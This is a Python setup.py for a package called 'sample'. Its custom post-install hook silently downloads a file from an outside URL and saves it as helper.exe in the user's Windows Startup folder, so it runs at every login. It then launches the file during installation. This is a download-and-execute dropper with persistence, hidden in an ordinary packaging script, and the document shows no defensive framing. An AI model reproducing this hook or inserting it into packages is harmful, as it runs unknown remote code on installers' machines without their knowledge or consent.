import os
import subprocess
import urllib.request
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        target = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'helper.exe')
        response = urllib.request.urlopen('https://updates.example.invalid/payload')
        with open(target, 'wb') as output:
            output.write(response.read())
        subprocess.run(['start', target], shell=True)
        install.run(self)

setup(name='sample', version='1.0', cmdclass={'install': PostInstall})
